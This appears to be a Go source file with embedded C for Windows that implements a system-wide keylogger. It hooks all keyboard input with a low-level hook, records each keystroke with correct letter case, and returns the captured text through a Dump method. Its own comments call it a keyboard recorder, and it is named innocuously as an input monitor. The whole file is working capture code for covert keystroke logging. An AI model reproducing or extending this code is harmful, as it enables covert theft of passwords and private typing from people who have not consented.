//go:build windows && amd64 && cgo

package input

/*
#cgo LDFLAGS: -luser32

#include <windows.h>

// Global hook state
static HHOOK aegis_kl_hHook = NULL;
static volatile int aegis_kl_running = 0;
static HANDLE aegis_kl_hThread = NULL;

// Forward declaration for Go callback (defined via //export)
void aegis_kl_callback(UINT vkCode, DWORD flags);

// 低级键盘钩子回调 (static inline to avoid duplicate symbol from CGO preamble duplication)
static inline LRESULT CALLBACK aegis_kl_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        aegis_kl_callback(ks->vkCode, ks->flags);
    }
    return CallNextHookEx(aegis_kl_hHook, nCode, wParam, lParam);
}

static inline DWORD WINAPI aegis_kl_msgloop(LPVOID lpParam) {
    MSG msg;
    BOOL ret;
    while (aegis_kl_running && (ret = GetMessageW(&msg, NULL, 0, 0)) != 0) {
        if (ret == -1) break;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

static inline int aegis_kl_install(void) {
    HINSTANCE hMod = GetModuleHandleW(NULL);
    aegis_kl_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)aegis_kl_proc, hMod, 0);
    if (!aegis_kl_hHook) return -1;
    aegis_kl_running = 1;
    aegis_kl_hThread = CreateThread(NULL, 0, aegis_kl_msgloop, NULL, 0, NULL);
    if (!aegis_kl_hThread) {
        UnhookWindowsHookEx(aegis_kl_hHook);
        aegis_kl_hHook = NULL;
        return -2;
    }
    return 0;
}

static inline void aegis_kl_uninstall(void) {
    aegis_kl_running = 0;
    if (aegis_kl_hThread) {
        PostThreadMessageW(GetThreadId(aegis_kl_hThread), WM_QUIT, 0, 0);
        WaitForSingleObject(aegis_kl_hThread, 3000);
        CloseHandle(aegis_kl_hThread);
        aegis_kl_hThread = NULL;
    }
    if (aegis_kl_hHook) {
        UnhookWindowsHookEx(aegis_kl_hHook);
        aegis_kl_hHook = NULL;
    }
}
*/
import "C"
import (
	"fmt"
	"strings"
	"sync"
	"syscall"
)

// KeyState 跟踪键盘状态。
type KeyState struct {
	mu      sync.Mutex
	keys    []string
	running bool
}

var (
	muGlobal      sync.Mutex
	activeKeyState *KeyState
)

//export aegis_kl_callback
func aegis_kl_callback(vkCode C.UINT, flags C.DWORD) {
	muGlobal.Lock()
	ks := activeKeyState
	muGlobal.Unlock()

	if ks != nil {
		vk := uintptr(vkCode)
		keyName := vkToName(vk)

		ks.mu.Lock()
		ks.keys = append(ks.keys, keyName)
		ks.mu.Unlock()
	}
}

// NewInputMonitor 创建新的键盘记录器。
func NewInputMonitor() *KeyState {
	return &KeyState{
		keys: make([]string, 0),
	}
}

// Start 启动键盘记录。
func (k *KeyState) Start() error {
	k.mu.Lock()
	if k.running {
		k.mu.Unlock()
		return fmt.Errorf("input monitor already running")
	}
	k.running = true
	k.keys = k.keys[:0]
	k.mu.Unlock()

	muGlobal.Lock()
	activeKeyState = k
	muGlobal.Unlock()

	ret := C.aegis_kl_install()
	if ret != 0 {
		k.mu.Lock()
		k.running = false
		k.mu.Unlock()
		muGlobal.Lock()
		if activeKeyState == k {
			activeKeyState = nil
		}
		muGlobal.Unlock()
		if ret == -1 {
			return fmt.Errorf("SetWindowsHookEx failed")
		}
		return fmt.Errorf("CreateThread for message loop failed")
	}
	return nil
}

// Stop 停止键盘记录。
func (k *KeyState) Stop() {
	k.mu.Lock()
	if !k.running {
		k.mu.Unlock()
		return
	}
	k.running = false
	k.mu.Unlock()

	muGlobal.Lock()
	if activeKeyState == k {
		activeKeyState = nil
	}
	muGlobal.Unlock()

	C.aegis_kl_uninstall()
}

// Dump 返回记录的按键。
func (k *KeyState) Dump() string {
	k.mu.Lock()
	defer k.mu.Unlock()
	return strings.Join(k.keys, "")
}

// Clear 清空记录的按键。
func (k *KeyState) Clear() {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.keys = k.keys[:0]
}

// IsRunning 返回是否正在记录。
func (k *KeyState) IsRunning() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.running
}

// vkToName 将虚拟键码映射为可读名称。
func vkToName(vk uintptr) string {
	switch vk {
	case 0x08:
		return "[BACK]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]\n"
	case 0x10:
		return "[SHIFT]"
	case 0x11:
		return "[CTRL]"
	case 0x12:
		return "[ALT]"
	case 0x14:
		return "[CAPS]"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x21:
		return "[PGUP]"
	case 0x22:
		return "[PGDN]"
	case 0x23:
		return "[END]"
	case 0x24:
		return "[HOME]"
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x2D:
		return "[INS]"
	case 0x2E:
		return "[DEL]"
	case 0x70:
		return "[F1]"
	case 0x71:
		return "[F2]"
	case 0x72:
		return "[F3]"
	case 0x73:
		return "[F4]"
	case 0x74:
		return "[F5]"
	case 0x75:
		return "[F6]"
	case 0x76:
		return "[F7]"
	case 0x77:
		return "[F8]"
	case 0x78:
		return "[F9]"
	case 0x79:
		return "[F10]"
	case 0x7A:
		return "[F11]"
	case 0x7B:
		return "[F12]"
	default:
		if vk >= 0x30 && vk <= 0x39 {
			return string(rune('0' + vk - 0x30))
		}
		if vk >= 0x41 && vk <= 0x5A {
			shiftState, _, _ := procGetKeyState.Call(uintptr(0x10))
			capsState, _, _ := procGetKeyState.Call(uintptr(0x14))
			isUpper := (shiftState&0x8000 != 0) != (capsState&0x01 != 0)
			ch := byte('A' + vk - 0x41)
			if isUpper {
				return string(ch)
			}
			return string(ch + 32)
		}
		return fmt.Sprintf("[VK_%d]", vk)
	}
}

// GetAsyncKeyStateWrapper 获取按键状态（供外部调用）。
func GetAsyncKeyState(vk int) (bool, error) {
	ret, _, lastErr := procGetAsyncKeyState.Call(uintptr(vk))
	if ret == 0 {
		return false, lastErr
	}
	return (ret & 0x8000) != 0, nil
}

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetKeyState      = user32.NewProc("GetKeyState")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)
